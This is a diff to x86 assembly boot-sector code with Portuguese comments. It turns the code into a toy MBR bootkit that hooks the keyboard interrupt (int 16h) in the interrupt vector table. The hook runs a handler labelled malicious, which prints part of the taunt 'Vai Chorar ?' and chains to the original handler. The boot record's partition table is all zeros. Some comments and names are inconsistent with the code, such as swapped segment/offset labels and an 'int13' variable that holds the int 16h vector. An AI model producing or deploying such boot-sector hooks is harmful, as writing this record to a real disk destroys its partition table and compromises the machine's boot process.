@@ -99,8 +99,11 @@ transfer_bytes:
 
     ; Inclusão de Interrupt Handler (Interrupt Vector Table = IVT)
     ; nesse exemplo eu vou utilizar a interrupção 0x16 (Keyboard I/O)
-    mov ax, word [es:0x13*4]   ; segmento
-    mov bx, word [es:0x13*4+2] ; offset
+    mov ax, word [es:0x16*4]   ; segmento
+    mov bx, word [es:0x16*4+2] ; offset
+
+    mov [cs:current_int13-transfer_bytes], ax
+    mov [cs:current_int13-transfer_bytes+2], bx
 
     mov ax, interrupt       ; Hookando o endereço de Interrupt no ax
     sub ax, transfer_bytes  
@@ -116,11 +119,29 @@ transfer_bytes:
 ; Codigo Hookado ao IVT
 interrupt:
     pushf
+    
     popf
-    retf
+    
+    ; CODIGO DE INTERRUPÇÂO MALICIOSO!
+    pusha
+    mov ah, 0x0E
+    mov al, [cs:msg-transfer_bytes]
+    int 10h
+
+
+    popa
+    
+    push word [cs:current_int13-transfer_bytes+2] ; segment    
+    push word [cs:current_int13-transfer_bytes]   ; offset    
+    
+    retf ; Da um pop no IP e no CS (code segment)
+
+
+current_int13:
+    dd 0xDEADBEEF ; O beef morto esta sempre presente em nossas vidas!
 
 msg:
-    db "Vai Chorar ?"                        ; our evil message
+    db "Vai Chorar ?"
 ; FIM do transfer_bytes
 transfer_end:
 
@@ -138,10 +159,6 @@ db "Qual o proposito de existência humana?(ಥ _ ಥ)"
 times (0x1b4 - ($-$$)) nop  
 
 part_table:
-times 10 db 0
-times 16 db 0
-times 16 db 0
-times 16 db 0
-times 16 db 0
+times 74 db 0
 
 dw 0xAA55
